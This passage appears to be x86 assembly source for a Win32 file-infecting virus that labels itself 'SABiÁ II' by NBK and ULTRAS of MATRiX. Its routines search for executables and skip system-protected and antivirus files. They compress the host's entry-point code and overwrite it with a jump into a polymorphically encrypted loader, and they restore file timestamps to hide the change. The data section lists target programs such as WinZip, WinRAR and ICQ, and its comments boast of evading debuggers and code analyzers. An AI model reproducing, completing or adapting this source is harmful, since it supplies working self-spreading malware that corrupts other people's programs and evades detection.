   mov [edi.SH_VirtualAddress], idata_rva + 1000h
   mov [edi.SH_SizeOfRawData], 10000h
   mov eax, [(edi-40).SH_PointerToRawData]
   add eax, [(edi-40).SH_SizeOfRawData]
   mov [edi.SH_PointerToRawData], eax
   mov [edi.SH_Characteristics], GENERIC_READ OR GENERIC_WRITE OR GENERIC_EXECUTE

   push [w_ionumb@013]
   call call_GlobalFree
   inc eax

   set_file_mem_error:

   ret

   ajustar_no_file:

   push ecx
   sub edx, edx
   div ecx
   mov ecx, eax
   call rnd
   and eax, 7
   test eax, eax
   jnz ajustar_noinc
   inc eax  ;  NULL byte here = crash

   ajustar_noinc:

   xadd eax, ecx
   pop ecx
   imul eax, ecx
   ret

   infectar@001:

   pushad
   push offset w_handle@010
   call call_GetSystemTime
   push offset w_buffer@002
   push offset w_buffer@001
   call call_FindFirstFileA
   mov [w_mutex@003], eax
   inc eax
   jz infectar@002
   push [w_buffer@002.nFileSizeLow]
   pop [w_handle@002]
   cmp [w_handle@002], 8192 * 1
   jb infectar@003
   cmp [w_handle@002], 9216 * 1024
   ja infectar@003
   sub eax, eax
   cmp [SfcIsFileProtected], eax
   jz infectar@009
   push offset w_buffer@001
   push 0
   call [SfcIsFileProtected]
   test eax, eax
   jnz infectar@003

   infectar@009:

   IFDEF NO_INFECT_AV

   push 6
   pop ecx
   call $+5+(6*2)
   db 'AV'
   db '00'
   db 'VS'
   db 'RW'
   db 'VC'
   db 'GP'
   pop esi

   infectar@010:

   mov ebp, ecx
   push offset w_buffer@001
   pop edi
   lodsw
   mov cx, ax
   xchg edi, esi

   infectar@011:

   lodsb
   cmp [esi], cx
   je infectar@003
   test al, al
   jnz infectar@011
   xchg edi, esi
   mov ecx, ebp
   loop infectar@010

   ENDIF

   call w_IO@001
   test eax, eax
   jz infectar@003
   mov esi, eax
   mov ecx, [w_handle@002]
   sub ecx, 5
   call patch_buffer
   test eax, eax
   jnz infectar@005
   mov eax, esi
   cmp word ptr [esi], 'ZM'
   jnz infectar@005
   cmp byte ptr [esi+24], '@'
   jb infectar@005
   add esi, [eax+60]
   push dword ptr [eax+60]
   pop  [w_ionumb@002]
   mov ecx, [w_handle@002]
   add ecx, eax
   cmp ecx, esi
   jbe infectar@005
   cmp dword ptr [esi], 'EP'
   jne infectar@005
   push dword ptr [esi+52]
   pop [w_ionumb@001]
   push dword ptr [esi+40]
   pop [w_ionumb@004]
   movzx eax, word ptr [esi+6]
   mov [convert@004], eax
   movzx ecx, word ptr [esi+20]
   add esi, ecx
   lea esi, [esi+24]
   mov [convert@005], esi

   ; ESI = first section

   mov ecx, [convert@004]
   mov eax, [w_ionumb@004]

   infectar@013:

   cmp [esi+12], eax
   jbe infectar@012
   add esi, 40
   loop infectar@013
   jmp infectar@005

   infectar@012:

   mov [convert@006], esi
   call convert@001
   mov [w_ionumb@006], eax
   test eax, eax
   jz infectar@005
   mov ecx, eax
   add ecx, [w_handle@004]

   IF TIMES_INFECT EQ TRUE

   cmp byte ptr [ecx], 9ch
   je infectar@005
   cmp byte ptr [ecx], 60h
   je infectar@005

   ENDIF

   mov ebx, [esi+16]
   cmp ebx, eax
   jbe infectar@005
   sub ebx, eax        ;   how much space we still have
   add ebx, [esi+20]   ;   add offset to file
   mov [w_ionumb@008], ebx
   cmp ebx, (SII + loader_size)
   jb infectar@005
   push dword ptr [esi+20]
   pop [w_ionumb@003]

   ; Look for <GetProcAddress> & <GetModuleHandle/LoadLibrary>

   mov esi, [w_ionumb@002]
   add esi, [w_handle@004]
   sub esi, -128
   lodsd
   call convert@001
   test eax, eax
   jz infectar@005
   mov ecx, eax
   lodsd
   add eax, ecx
   add ecx, [w_handle@004]
   add eax, [w_handle@004]
   xchg edi, eax
   mov [w_handle@015], ecx
   sub ecx, 14h
   mov esi, [w_handle@004]
   mov ebx, esi
   add esi, [w_handle@002]
   pushad
   push 'erdd'
   push 'Acor'
   push 'PteG'
   push esp ;  GetProcAddress
   call it@001
   sub esp, -(4*4)
   mov [w_handle@017], eax
   test eax, eax
   popad
   jz infectar@005
   pushad
   push 'yra'
   push 'rbiL'
   push 'daoL'
   push esp ;  LoadLibrary
   call it@001
   sub esp, -(4*4)
   mov [w_handle@018], eax
   test eax, eax
   popad
   jnz infectar@016
   pushad
   push 'naHe'
   push 'ludo'
   push 'MteG'
   push esp ;  GetModuleHandle
   call it@001
   sub esp, -(4*4)
   mov [w_handle@018], eax
   test eax, eax
   popad
   jz infectar@005

   infectar@016:

   mov esi, [convert@006]  ;  [convert@005]
   mov eax, [esi+20]
   cmp eax, [w_ionumb@005] ;  Could import table be overwrited ?
   ja infectar@006         ;  no, let's infect
   add eax, [esi+16]
   cmp eax, [w_ionumb@005]
   ja infectar@005         ;  yes ... go out

   infectar@006:

   IF DEBUG EQ TRUE

   pushad
   push 1
   call $+5+32
   db 'CAN I TRY TO INFECT THIS FILE ?',0
   push offset w_buffer@001
   push 0
   call call_MessageBoxA
   cmp eax, 2
   popad
   je infectar@005

   ENDIF

   ; ok, let's alloc some memory and compact PE code

   mov eax, [w_ionumb@008]
   add eax, 1024
   push eax
   push 40h
   call call_GlobalAlloc
   mov [w_handle@019], eax
   test eax, eax
   jz infectar@005
   mov [loadmem@002], loader_size
   mov eax, [w_handle@014]
   add [loadmem@002], eax
   push 0                  ;   no callback
   push offset workmem     ;   work memory
   push [w_ionumb@008]     ;   size
   push [w_handle@019]     ;   to compress to...
   mov eax, [w_ionumb@006] ;   where it starts (entry point)
   add eax, [w_handle@004] ;   Mapview
   push eax
   call _ap_pack
   mov [w_ionumb@010], eax ; save new size
   test eax, eax
   jz infectar@007
   add [loadmem@002], eax
   mov ecx, [w_ionumb@008]   ;   original size
   mov eax, [loadmem@002]
   cmp ecx, eax
   jbe infectar@007
   sub ecx, eax
   mov [w_ionumb@011], ecx   ;   how much space after compress it ?
   cmp ecx, 1
   jbe infectar@007
   cmp [w_ionumb@011], (loader_size * 7)
   jbe infectar@007
   push offset w_buffer@001
   push offset w_buffer@007
   call call_lstrcpyA
   push 'pk'
   push 'b.el'
   push 'if_á'
   push 'ibas'
   push esp
   push offset w_buffer@007
   call call_lstrcatA
   sub esp, -(4*4)
   push FALSE
   push offset w_buffer@007
   push offset w_buffer@001
   call call_CopyFileA
   dec eax
   jnz infectar@015
   mov edi, [w_ionumb@006]   ;   where to copy my viral code
   add edi, [w_handle@004]
   mov ax, 609Ch  ;  fixed
   stosw          ;  bytes
   mov al, 0E9h   ;  :(
   stosb
   mov eax, [w_ionumb@010]
   add eax, [w_handle@014]
   add eax, 4
   stosd
   call rnd
   stosd

   ;   compressed virus...

   mov esi, [w_handle@013]
   mov ecx, [w_handle@014]
   push edi
   cld
   rep movsb

   ;   compressed file data...

   mov esi, [w_handle@019]
   mov ecx, [w_ionumb@010]
   cld
   rep movsb
   push edi
   pop ebp
   pop edi
   sub edi, 4
   mov esi, edi
   mov eax, [w_handle@014]
   add eax, [w_ionumb@010]
   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax
   push edi
   pushad

   call rnd
   push eax
   push eax
   pop edx
   pop [rnd_loader1_xor]
   call rnd
   push eax
   push eax
   pop ebp
   pop [rnd_loader1_sub]
   call rnd
   push eax
   push eax
   pop ebx
   pop [rnd_loader1_xor2]
   call rnd
   push eax
   pop [rnd_loader1_add]

   encrypt@002:

   sub [esi], eax
   xor [esi], ebx
   add [esi], ebp
   xor [esi], edx
   add esi, 4
   loop encrypt@002

   popad

   call enc_by_first

   call rnd
   sub ebx, ebx
   pop edi
   xchg ebx, eax
   xchg [edi], eax   ;   they still can try all dwords :P
   mov [xor_hide], ebx
   xor eax, ebx
   mov [edi], eax
   call rnd
   and eax, 0f0f0f0fh
   add eax, 'AAAA'
   mov [string_rnd_filez], eax   ;  randomize 'tmp filez' created by loader

;maybe alloc memory and encrypt loader "here",
;pass control to poly, save flags, free memory
;restore flags and test for errors

   push offset loader@ini
   push loader_size
   push loader_size * 8
   push (loader_size * 10) + 1024
   call do_poly
   jc error_infecting   ;   
   mov eax, [kme3_out_size]
   cmp [w_ionumb@011], eax
   jb error_infecting
   sub [w_ionumb@011], eax
   push ebp
   pop edi
   mov esi, [w_ionumb@013]
   mov ecx, [kme3_out_size]
   cld
   rep movsb

   IF DEBUG EQ TRUE

   mov al, 'N'
   mov ecx, [w_ionumb@011]
   cld
   rep stosb

   push 0
   call $+5+24
   db 'THIS FILE WAS INFECTED:',0
   push offset w_buffer@001
   push 0
   call call_MessageBoxA

   ENDIF

   jmp infectar@014

   it@001:

   ; ini IT ECX
   ; end IT EDI

   sub ecx, -14h
   mov eax, [ecx+12]
   call convert@001
   test eax, eax
   jz it@005
   mov [w_ionumb@005], eax
   lea edx, [eax+ebx]
   cmp edx, esi
   jae it@005
   cmp [edx], 'NREK'
   jne it@001
   mov eax, [ecx+16]
   mov [w_handle@007], eax
   call convert@001
   test eax, eax
   jz it@005
   lea esi, [eax+ebx]
   sub ecx, ecx
   xchg edi, ecx
   sub ecx, [w_handle@015]

   it@002:

   lodsd
   call convert@001
   test eax, eax
   jz it@005
   lea eax, [eax+ebx]
   inc eax
   inc eax
   push eax
   push dword ptr [esp+8]
   push eax
   call _lstrcmp
   mov edx, eax
   pop eax
   test edx, edx
   jz it@004
   inc edi
   dec ecx
   jecxz it@005
   jmp it@002

   it@004:

   lea edi, [edi*4]
   mov eax, [w_handle@007]
   add eax, edi
   add eax, [w_ionumb@001]
   ret

   it@005:

   sub eax, eax
   ret

   _lstrcmp:

   push eax
   mov eax, esp
   pushad
   mov edx, 1
   mov esi, [eax+8]
   mov edi, [eax+12]
   mov ecx, 11

   _l1:

   lodsb
   mov bl, al
   xchg esi, edi
   lodsb
   cmp al, bl
   jne _l2
   loop _l1
   dec edx

   _l2:

   mov [esp+(4*7)], edx
   popad
   add esp, 4
   ret (4*2)

   convert@001:

   pushad
   mov ecx, 12345678h
   org $-4
   convert@004 dd 0   ;   numero de secoes
   mov esi, 12345678h
   org $-4
   convert@005 dd 0   ;   inicio das secoes

   convert@002:

   mov ebx, eax
   sub ebx, [esi+12]
   cmp [esi+8], ebx
   ja convert@003
   add esi, 40
   loop convert@002
   xor ebx, ebx
   jmp short convert@003 + 3

   convert@003:

   add ebx, [esi+20]
   mov [esp+(4*7)], ebx
   popad
   ret

   error_infecting:

   call w_IOB@001
   push FALSE
   push offset w_buffer@001
   push offset w_buffer@007
   call call_CopyFileA

   infectar@014:

   push [w_ionumb@013]
   call call_GlobalFree

   infectar@015:

   push offset w_buffer@007
   call call_DeleteFileA

   infectar@007:

   push [w_handle@019]
   call call_GlobalFree

   infectar@005:

   call w_IOB@001

   infectar@003:

   push [w_mutex@003]
   call call_FindClose

   infectar@002:

   popad
   ret

   do_poly:

   push ebp
   mov ebp, esp
   pushad
   push dword ptr [ebp+8]   ;  (loader_size * 10) + 1024
   push 40h
   call call_GlobalAlloc
   mov [w_ionumb@013], eax
   test eax, eax
   jz do_poly_error
   mov ebx, eax
   call rnd
   push FLAG_NOJMPS+FLAG_EIP0
   push CMD_ALL
   push CMD2_ALL
   push REG_ALL
   push eax
   push -1
   push offset kme3_out_entry
   push offset kme3_out_size
   push NULL
   push dword ptr [ebp+12]   ;  loader_size * 8
   push ebx   ;   output offset
   push NULL   ;   input eip
   push dword ptr [ebp+16]  ;  loader_size   ;   input size
   push dword ptr [ebp+20]  ;  offset loader@ini
   push NULL
   push NULL
   call kme_main
   mov al, ?
   org $-1

   do_poly_error:

   stc
   popad
   pop ebp
   ret (4*4)

   rnd_init:

   call call_GetTickCount
   and eax, 11111111111b
   inc eax
   push eax
   call call_GetTickCount
   pop ecx
   push ecx

   .r0:

   lea eax, [eax*8]
   loop .r0
   pop ecx
   sub [matrix], eax

   .r1:

   call rnd
   loop .r1
   ret

   w_IO@001:

   ;   Open files with name in w_buffer@001

   pushad
   mov [w_handle@002], 0
   push 0
   push 0
   push OPEN_EXISTING
   jmp short w_IO@003

   w_IO@002:

   pushad
   push 0
   push 0
   push 2

   w_IO@003:

   push offset w_buffer@001
   call call_GetFileAttributesA
   mov [w_handle@008], eax
   inc eax
   jnz w_IO@005
   mov [w_handle@008], FILE_ATTRIBUTE_NORMAL

   w_IO@005:

   push FILE_ATTRIBUTE_NORMAL
   push offset w_buffer@001
   call call_SetFileAttributesA
   push 0
   push 1   ;   FILE_SHARE_READ
   sub eax, eax
   cmp [w_handle@012], eax
   jz w_IO@006
   push GENERIC_READ
   jmp short w_IO@007

   w_IO@006:

   push GENERIC_READ or GENERIC_WRITE

   w_IO@007:

   push offset w_buffer@001
   call call_CreateFileA
   mov [w_handle@001], eax
   inc eax
   jz w_IOB@005
   mov eax, offset w_handle@009
   push eax
   add eax, 8
   push eax
   add eax, 8
   push eax
   push [w_handle@001]
   call call_GetFileTime
   push 0
   push [w_handle@001]
   call call_GetFileSize
   cmp [w_handle@002], 0
   jne w_IO@004
   mov [w_handle@002], eax

   w_IO@004:

   push 0
   push [w_handle@002]
   push 0
   sub eax, eax
   cmp [w_handle@012], eax
   je w_IO@008
   push 2
   jmp short w_IO@009

   w_IO@008:

   push 4

   w_IO@009:

   push 0
   push [w_handle@001]
   call call_CreateFileMappingA
   mov [w_handle@003], eax
   test eax,eax
   jz w_IOB@004
   push [w_handle@002]
   push 0
   push 0
   sub eax, eax
   cmp [w_handle@012], eax
   je w_IOB@010
   push 4
   jmp short w_IOB@011

   w_IOB@010:

   push 2

   w_IOB@011:

   push [w_handle@003]
   call call_MapViewOfFile
   mov [w_handle@004], eax
   test eax,eax
   jz w_IOB@003
   mov [esp+(4*7)], eax
   sub eax, eax
   mov [w_handle@012], eax
   popad
   ret

   w_IOB@001:

   pushad

   w_IOB@002:

   push [w_handle@004]
   call call_UnmapViewOfFile

   w_IOB@003:

   push [w_handle@003]
   call call_CloseHandle
   push 0
   push 0
   push [w_handle@002]
   push [w_handle@001]
   call call_SetFilePointer
   push [w_handle@001]
   call call_SetEndOfFile

   w_IOB@004:

   mov eax, offset w_handle@009
   push eax
   add eax, 8
   push eax
   add eax, 8
   push eax
   push [w_handle@001]
   call call_SetFileTime
   push [w_handle@001]
   call call_CloseHandle

   w_IOB@005:

   push [w_handle@008]
   push offset w_buffer@001
   call call_SetFileAttributesA
   popad
   sub eax, eax
   mov [w_handle@012], eax
   ret

   system@001:

   pushad
   call call_GetTickCount
   xchg eax, ecx
   sub eax, eax
   cmp ecx, dia * 2
   jae system@002
   inc eax   ;   TRUE

   system@002:

   mov [esp+(4*7)], eax
   popad
   ret

   aumentar@001:

   push ecx
   lea ecx, [eax+SII]

   aumentar@002:

   lea eax, [eax*2]
   cmp ecx, eax
   ja aumentar@002
   pop ecx
   ret

   enc_by_first:

   lodsd
   not eax
   mov ebx, eax
   stosd

   .bf1:

   lodsd
   xor eax, ebx
   stosd
   mov ebx, eax
   loop .bf1
   ret

   align 4

   _main_loader label

   ;1-alloc memory
   ;2-decrypt code
   ;3-unpack code
   ;4-get api's
   ;5-create/execute new thread

extrn LoadLibraryA:proc
extrn GetProcAddress:proc

   push 0
   push 'LLD.'
   push '23LE'
   push 'NREK'
   push esp
   call fx_LoadLibrary

   push eax
   pop ebp

   push 'col'
   push 'lAla'
   push 'bolG'
   push esp
   push ebp
   call fx_GetProcAddress
   sub esp, -(4*3)

   push 9000h
   push 40h
   call eax
   mov edi, eax
   push edi
   push edi
   push offset _entry

   mov esi, [esp]
   mov eax, 12345678h
   m_handle@003 equ dword ptr $-4
   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax

   push esi edi ecx
   call _main_l0
   pop ecx edi esi

   l2_decrypt@001:

   add [esi], 12345678h
   rnd_loader2_add equ dword ptr $-4
   xor [esi], 12345678h
   rnd_loader2_xor equ dword ptr $-4
   sub [esi], 12345678h
   rnd_loader2_sub equ dword ptr $-4
   lodsd
   loop l2_decrypt@001

   call _aP_depack_asm

   add edi, eax
   push eax
   push edi

   push edi
   push 00409000h

   mov esi, [esp]
   mov eax, 12345678h
   m_handle@005 equ dword ptr $-4
   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax

   push esi edi ecx
   call _main_l0
   pop ecx edi esi

   l2_decrypt@002:

   add [esi], 12345678h
   rnd_loader2_add2 equ dword ptr $-4
   xor [esi], 12345678h
   rnd_loader2_xor2 equ dword ptr $-4
   sub [esi], 12345678h
   rnd_loader2_sub2 equ dword ptr $-4
   lodsd
   loop l2_decrypt@002

   call _aP_depack_asm

   pop esi
   mov edi, 00409000h
   mov ecx, eax   ;  unpacked lenght
   rep movsb

   pop ecx  ;  unpacked lenght
   pop esi
   mov edi, offset _entry
   rep movsb

   ;  get api's

   _main_add_api:

   mov edi, offset _entry + (offset import - offset _entry) + 1

   call _main_list

   include _list.INC

   _main_list:

   pop esi

   _main_li0:

   push esi
   push ebp
   call fx_GetProcAddress

   test eax, eax
   jnz _main_li2
   add edi, 6  ;  the old api values could be still working
   jmp _main_li1

   _main_li2:

   stosd
   inc edi
   inc edi

   _main_li1:

   lodsb
   test al, al
   jnz _main_li1
   mov al, 'X'
   cmp [esi], al
   jne _main_li0

   mov edi, offset _entry

   push 'LL'
   push 'D.23'
   push 'RESU'
   push esp
   call fx_LoadLibrary

   push 'Axo'
   push 'Bega'
   push 'sseM'
   push esp
   push eax
   call fx_GetProcAddress
   mov [edi+(offset call_MessageBoxA - offset _entry)+1], eax

   push 0
   push esp
   push 0
   push 0
   push edi
   push 0
   push 0
   lea eax, [edi+(offset call_CreateThread - offset _entry)]
   call eax

   push THREAD_PRIORITY_LOWEST
   push eax
   lea eax, [edi+(offset call_SetThreadPriority - offset _entry)]
   call eax

jmp $

   ;  this will fuck some debuggers

   push -1
   lea eax, [edi+(offset call_ExitThread - offset _entry)]
   call eax

   _main_l0:   ;  let's fuck some code analyzers...

   mov edi, esi
   lodsd
   mov ebx, eax
   not eax
   stosd

   _main_l1:

   lodsd
   push eax
   xor eax, ebx
   pop ebx
   stosd
   loop _main_l1
   ret

   fx_LoadLibrary:

   ;  imgbase + .idata rva + loadlibrary

   db 0b8h
   _api_loadlibrary dd 00400000h + idata_rva + 34h
   jmp [eax]

   fx_GetProcAddress:

   ;  imgbase + .idata rva + getprocaddress

   db 0b8h
   _api_getprocaddress dd 00400000h + idata_rva + 38h
   jmp [eax]

   include _depack.INC

   align 4

   _main_loader_end label
   _main_loader_size equ (offset _main_loader_end - offset _main_loader)

   ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;
   ;                                                           ;
   ;  CODE AND DATA AFTER HERE WILL EXIST ONLY IN FIRST VERSION;
   ;                                                           ;
   ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;

   entry:

   ; first generation header

   push FIRST_VERSION_KERNEL
   pop ebp
   push offset _entry
   push offset _entry
   jmp _main_add_api

   ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;
   ;                                                              ;
   ;  CODE AND DATA BEFORE HERE WILL EXIST ONLY IN FIRST VERSION  ;
   ;                                                              ;
   ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;

   .data

   v_name label

   db 'SABiÁ II',13,10
   db 'By: NBK & ULTRAS [MATRiX]',0

   aplib@006 label

   db 00dh,00ah,00dh,00ah,061h,050h,04ch,069h,062h,020h,076h,030h,02eh,032h,032h,062h
   db 020h,020h,02dh,020h,020h,074h,068h,065h,020h,073h,06dh,061h,06ch,06ch,065h,072h
   db 020h,074h,068h,065h,020h,062h,065h,074h,074h,065h,072h,020h,03ah,029h,00dh,00ah
   db 043h,06fh,070h,079h,072h,069h,067h,068h,074h,020h,028h,063h,029h,020h,031h,039h
   db 039h,038h,02dh,039h,039h,020h,062h,079h,020h,04ah,06fh,065h,072h,067h,065h,06eh
   db 020h,049h,062h,073h,065h,06eh,020h,02fh,020h,04ah,069h,062h,07ah,02ch,020h,041h
   db 06ch,06ch,020h,052h,069h,067h,068h,074h,073h,020h,052h,065h,073h,065h,072h,076h
   db 065h,064h,00dh,00ah,00dh,00ah,054h,068h,069h,073h,020h,063h,06fh,070h,079h,020h
   db 06fh,066h,020h,061h,050h,04ch,069h,062h,020h,069h,073h,020h,066h,072h,065h,065h
   db 020h,066h,06fh,072h,020h,06eh,06fh,06eh,02dh,070h,072h,06fh,066h,069h,074h,061h
   db 062h,06ch,065h,020h,075h,073h,065h,02eh,00dh,00ah,00dh,00ah,046h,06fh,072h,020h
   db 06dh,06fh,072h,065h,020h,069h,06eh,066h,06fh,072h,06dh,061h,074h,069h,06fh,06eh
   db 03ah,020h,068h,074h,074h,070h,03ah,02fh,02fh,061h,070h,061h,063h,06bh,02eh,063h
   db 06ah,062h,02eh,06eh,065h,074h,02fh,00dh,00ah,00dh,00ah,000h,000h,000h,000h,000h
   db 04fh,01bh,079h,029h,0ebh,0c9h,0e5h,042h,0a5h,040h,0ceh,0b0h,011h,0edh,02ch,024h
   db 035h,060h,07dh,0b4h,0d4h,029h,001h,080h,039h,0ffh,0b2h,080h,0c8h,039h,09ch,01ch

   array@001  dd offset NAPSTER
              dd offset GETRIGHT
              dd offset WINZIP32
              dd offset EUDORA
              dd offset WINRAR
              dd offset W32DSM89
              dd offset WZSEPE32
              dd offset WSCRIPT
              dd offset ICQ
   array@002  label

   NAPSTER    db 'NAPSTER.EXE',0
   GETRIGHT   db 'GETRIGHT.EXE',0
   WINZIP32   db 'WINZIP32.EXE',0
   EUDORA     db 'EUDORA.EXE',0
   WINRAR     db 'WINRAR.EXE',0
   W32DSM89   db 'W32DSM89.EXE',0
   WZSEPE32   db 'WZSEPE32.EXE',0
   WSCRIPT    db 'WSCRIPT.EXE',0
   ICQ        db 'ICQ.EXE',0

   include _arj.INC   ;   (c)Vecna

   _fixed_data_s2 label

   .data?

   db 10000 dup (?)

   _save_esp   dd ?
   _save_eip   dd ?
   _save_cs    dd ?

   thrcontext db 0CCh dup(?)
              even
              db 2048 dup(?)    ; should be in the 1st page
   end_of_my_stack:

   aplib@013 dd ?
   aplib@009 dd ?
   aplib@017 dd ?
   aplib@014 dd ?
   aplib@004 dd ?
   aplib@003 dd ?
   aplib@086 dd ?
   aplib@015 dd ?
   aplib@005 dd ?
   aplib@016 dd ?

   tmapix dd ?
   InitTmTable dd ?
   GetTmElementByIndex dd ?
   CloseTmTable dd ?

   sfc dd ?
   SfcIsFileProtected dd ?

   w_mutex@002 dd ?   ;   HANDLE CreateMutex()
   w_mutex@003 dd ?   ;   HANDLE FindFirstFile()

   w_buffer@001 db MAX_PATH dup (?)  ;   General purposes, filename is the most important
   w_buffer@002 WIN32_FIND_DATA <?>  ;   blah
   w_buffer@003 OSVERSIONINFO <?>    ;   blah
   w_buffer@004 db (1024 * 4) dup(?) ;   Internet and GetLogicalDriveStrings()
   w_buffer@005 db MAX_PATH dup(?)   ;   Name of this file (don't changes)
   w_buffer@006 db MAX_PATH dup(?)   ;   WSOCK32 routine
   w_buffer@007 db MAX_PATH dup(?)   ;   Temporary name while infecting

   w_handle@001 dd ?   ;   HANDLE CreateFile
   w_handle@002 dd ?   ;   File size
   w_handle@003 dd ?   ;   HANDLE <CreateFileMapping>
   w_handle@004 dd ?   ;   HANDLE <MapViewOfFile>
   w_handle@007 dd ?   ;   Usado na IT
   w_handle@008 dd ?   ;   mapped file attributes
   w_handle@009 FILETIME   <?>
                FILETIME   <?>
                FILETIME   <?>
   w_handle@010 SYSTEMTIME <?>
   w_handle@011 dd ?   ;   Where is the EXE in the memory (same to the disk)
   w_handle@012 dd ?   ;   Tell if the file must be opened in
                       ;   read-only mode | read/write (NULL)
   w_handle@013 dd ?   ;   Where is the .EXE packed in memory
   w_handle@015 dd ?   ;   IT starts
   w_handle@019 dd ?   ;   HANDLE GlobalAlloc
   w_ionumb@002 dd ?   ;   Offset PE header (without memory value)
   w_ionumb@003 dd ?   ;   Offset first section
   w_ionumb@005 dd ?   ;   Import table in file
   w_ionumb@006 dd ?   ;   Where loader starts in the new file
   w_ionumb@007 dd ?   ;   HANDLE RegOpenKey ou something like
   w_ionumb@009 dd ?   ;   Offset para header da primeira secao
   w_ionumb@011 dd ?   ;   How much space we still have after compress code (in file)
   w_ionumb@013 dd ?   ;   Polymorphic-engines address

   m_handle@001 dd ?   ;   onde começa o novo arquivo (handle GlobalAlloc)
   m_handle@002 dd ?   ;   offset p/ nome da primeira secao
;   m_handle@003 dd ?   ;   tamanho compactado da primeira secao
   m_handle@004 dd ?   ;   novo tamanho da primeira secao no arquivo (rnd)
;   m_handle@005 dd ?   ;   tamanho compactado da secao .data
   m_handle@006 dd ?   ;   novo tamanho da secao .data no arquivo (rnd)
   m_handle@007 dd ?   ;   tamanho da secao do loader polimorfico no arquivo (fixo)
   m_handle@008 dd ?   ;   

   fsize3 dd         ?

   wsock32_addr dd   ?
   _send_2_ch   dd   ?
   _connect_2_ch dd  ?
   _recv_2_ch   dd   ?

   kme3_out_entry dd ?
   kme3_out_size  dd ?

   IMAGEHLP     dd   ?
   ap_SearchTreeForFile dd ?

   WININET      dd   ?
   ap_InternetGetConnectedState dd ?

   handle@010 STARTUPINFO <?>
   handle@011 PROCESS_INFORMATION <?>

   download     dd ?

   convert@006 dd ?

   aplib@010 dd ?
   db 400h dup (?)

   workmem db 640 * 1024 dup (?)

   end entry
   end
